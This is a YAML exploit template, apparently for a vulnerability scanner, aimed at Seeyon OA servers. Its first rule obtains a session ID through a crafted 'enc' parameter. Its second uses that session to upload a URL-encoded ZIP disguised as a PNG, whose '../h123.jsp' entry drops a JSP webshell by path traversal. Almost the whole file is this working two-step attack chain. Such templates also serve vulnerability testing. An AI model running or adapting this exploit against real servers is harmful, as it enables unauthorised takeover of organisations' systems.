id: seeyon-session-upload-webshell

info:
    name: seeyon session upload webshell
    author: zan8in
    severity: critical
    description: fofa app="致远互联-Seeyon-Server"

rules:
    r0:
        request:
            method: POST
            path: /seeyon/thirdpartyController.do
            headers:
              Content-Type: "application/x-www-form-urlencoded"
            body: |
              method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
        expression: |
          response.status == 200 && response.body.bcontains(bytes("a8genius.do"))
        output:
          search: '"(?P<cokies>([a-zA-Z0-9]{8}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{4}-[a-zA-Z0-9]{12}))".bsubmatch(response.body)'
          cokies: search["cokies"]
          
    r1:
        request:
            method: POST
            path: /seeyon/fileUpload.do?method=processUpload
            headers:
              Content-Type: "multipart/form-data;boundary=---------------------------310945848325598073452977702743"
              Cookie: "JSESSIONID={{cokies}}"
            body: |-
              -----------------------------310945848325598073452977702743
              Content-Disposition: form-data; name="file1"; filename="1.png"
              Content-Type: image/png
              
              %50%4b%03%04%14%00%00%00%08%00%0e%4e%3b%53%70%71%65%02%85%03%00%00%37%0a%00%00%0b%00%00%00%2e%2e%2f%68%31%32%33%2e%6a%73%70%b5%56%69%8f%d3%30%10%fd%2b%26%12%92%2d%22%8b%73%05%84%80%b6%bb%8b%84%b8%55%10%48%88%0f%8e%33%6d%03%b9%b0%1d%48%89%fa%df%19%1f%e9%c1%96%42%11%7c%d8%8d%63%bf%19%cf%7b%7e%f1%f4%c1%d5%2b%64%6a%54%51%cf%49%2f%d3%e8%96%3c%81%eb%d9%5d%71%4f%de%b8%73%f3%e6%6d%11%25%e3%6a%2b%b4%4e%23%fb%7f%33%57%e5%77%52%fc%a3%76%f6%5a%2f%59%42%64%89%43%f2%9e%40%6f%a0%ce%35%39%b3%ef%cf%1a%91%83%1a%da%2e%2b%0b%49%de%d3%ad%49%f2%9d%0d%ba%6b%41%d1%ef%2c%59%05%84%5b%27%af%69%b6%34%f0%e1%23%91%19%1b%14%98%4e%d5%c4%41%79%0e%b3%a2%06%87%a2%32%8b%c9%f5%18%31%bc%84%7a%6e%16%98%85%8c%79%42%7c%3f%26%d2%71%d6%34%25%88%9a%54%6c%20%46%2d%87%4f%e2%ab%e8%b9%54%cb%d6%34%fc%ac%68%17%58%91%4c%f7%cc%f2%39%98%27%b5%36%a2%96%40%a3%d3%8b%69%c4%12%c9%8b%ba%30%b4%7a%74%e3%fe%cd%b8%86%6f%64%27%4e%b7%20%f9%14%24%56%fe%14%96%53%7c%a3%bd%b4%69%26%58%8c%a6%2c%f6%59%58%12%a8%49%9e%37%8f%8b%5a%94%54%a3%8e%2b%29%8c%5c%10%7a%d1%4b%68%4d%d1%d4%04%d6%22%d4%5d%59%22%62%45%02%4d%ac%ca%e0%63%73%26%34%0c%35%23%43%18%62%28%49%7d%24%f2%26%8e%38%d7%20%3b%55%98%25%7f%0e%5a%8b%39%9c%17%73%d0%86%54%49%85%d8%03%88%5d%31%9e%9f%df%41%31%2a%de%b5%b9%30%40%f5%16%47%77%34%3a%9c%0c%f5%5c%31%f5%a8%15%af%84%59%f0%49%31%7f%52%1b%98%a3%07%6e%c4%a4%e2%b9%db%03%d1%dc%34%be%7a%7a%e3%c4%be%bc%6d%f1%f0%cf%84%06%6a%0f%f9%b2%40%c8%76%15%24%c2%47%42%7e%21%50%86%19%4e%6e%5f%d4%b2%c9%61%74%46%86%52%99%85%6a%be%69%b2%49%38%38%87%05%7c%12%a2%bf%8a%b2%83%1d%29%fd%7a%ea%c0%7c%d6%a8%17%a2%42%55%1c%bf%ce%14%25%9f%b8%75%94%e8%65%f6%09%a4%21%7e%67%85%39%7c%a4%d5%eb%39%98%45%93%d3%08%87%61%39%8a%dd%16%0c%3d%f6%b5%f9%0c%d4%63%c3%64%32%56%11%4e%9a%85%20%9b%ca%7f%16%6c%3b%2b%b8%d5%37%41%4d%cc%6c%0f%c0%e1%90%fa%10%3e%13%ee%3f%dd%d5%7a%c7%90%d3%a3%7d%ed%1e%8e%a0%5f%1e%80%53%84%ec%97%44%77%35%af%0a%2d%f9%e4%74%7a%71%72%7b%24%8a%6e%ff%95%32%b8%f3%da%67%08%fb%1b%d6%ff%8f%ed%4d%eb%b7%60%38%5f%da%25%cb%85%cd%02%9d%73%b0%5b%84%e2%ff%c4%72%3e%fa%1f%58%2e%87%83%96%3b%87%63%2c%e7%ab%62%98%f3%80%f8%6e%f5%b2%f8%9e%fb%25%f1%73%38%56%fc%e3%ac%36%12%dc%58%2d%87%3f%b4%da%11%6c%27%dd%6c%06%ea%ff%71%de%6b%b8%ab%0f%1f%5c%b5%9d%2c%78%05%af%60%91%ee%d8%4d%c1%97%2e%dc%d9%af%84%42%75%0c%28%d7%b0%f1%3a%76%e8%9e%da%47%4c%66%a2%d4%c0%92%62%46%a8%c6%db%1e%b7%b4%31%a7%06%cb%cf%3a%bc%d8%b1%f7%2f%4b%6c%da%11%4b%53%67%89%61%84%e9%bd%30%d7%12%df%53%b3%28%f4%4f%b2%6d%f5%7f%7b%cd%bf%76%05%30%24%0d%58%c1%10%0a%fe%39%eb%58%bb%8e%62%07%4f%9c%dd%8b%86%db%5e%73%aa%94%58%be%ec%4c%db%19%94%1b%44%45%84%52%f8%9e%da%1a%0e%02%e9%fa%23%99%a5%d4%ff%32%61%bf%a1%cf%7e%32%cb%8c%63%c5%28%1e%f5%7b%6e%4d%b4%d8%32%cf%1a%6c%6e%bd%b1%bd%4f%b7%4d%ad%c1%a6%7d%87%4d%d5%92%e7%df%ec%80%62%cf%e6%ba%cb%b4%ef%76%d7%63%ec%77%98%65%d3%ff%0e%06%ef%f4%b3%3e%14%81%b1%6b%ba%b6%0f%1b%d5%01%63%47%14%e1%4a%58%ed%ff%1d%82%a6%fb%01%50%4b%03%04%14%00%00%00%00%00%f5%64%8c%52%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%2e%2e%2f%50%4b%03%04%14%00%08%08%08%00%dd%74%24%51%00%00%00%00%00%00%00%00%00%00%00%00%0a%00%00%00%6c%61%79%6f%75%74%2e%78%6d%6c%e3%02%00%50%4b%07%08%93%06%d7%32%03%00%00%00%01%00%00%00%50%4b%01%02%3f%00%14%00%00%00%08%00%0e%4e%3b%53%70%71%65%02%85%03%00%00%37%0a%00%00%0b%00%24%00%00%00%00%00%00%00%20%00%00%00%00%00%00%00%2e%2e%2f%68%31%32%33%2e%6a%73%70%0a%00%20%00%00%00%00%00%01%00%18%00%64%a2%32%c4%41%b3%d7%01%64%a2%32%c4%41%b3%d7%01%53%52%2f%d9%57%2f%d7%01%50%4b%01%02%3f%00%14%00%00%00%00%00%f5%64%8c%52%00%00%00%00%00%00%00%00%00%00%00%00%03%00%24%00%00%00%00%00%00%00%10%00%00%00%ae%03%00%00%2e%2e%2f%0a%00%20%00%00%00%00%00%01%00%18%00%50%a5%c8%d9%55%2f%d7%01%50%a5%c8%d9%55%2f%d7%01%50%a5%c8%d9%55%2f%d7%01%50%4b%01%02%14%00%14%00%08%08%08%00%dd%74%24%51%93%06%d7%32%03%00%00%00%01%00%00%00%0a%00%00%00%00%00%00%00%00%00%00%00%00%00%cf%03%00%00%6c%61%79%6f%75%74%2e%78%6d%6c%50%4b%05%06%00%00%00%00%03%00%03%00%ea%00%00%00
              
              -----------------------------310945848325598073452977702743
              Content-Disposition: form-data; name="firstSave"

              true
              -----------------------------310945848325598073452977702743
              Content-Disposition: form-data; name="callMethod"

              resizeLayout
              -----------------------------310945848325598073452977702743
              Content-Disposition: form-data; name="isEncrypt"

              0
              -----------------------------310945848325598073452977702743
              Content-Disposition: form-data; name="takeOver"

              false
              -----------------------------310945848325598073452977702743
              Content-Disposition: form-data; name="type"

              0
              -----------------------------310945848325598073452977702743--
        expression: |
          response.status == 200 && response.body.bcontains(bytes("fileurls")) 
expression: r0() && r1()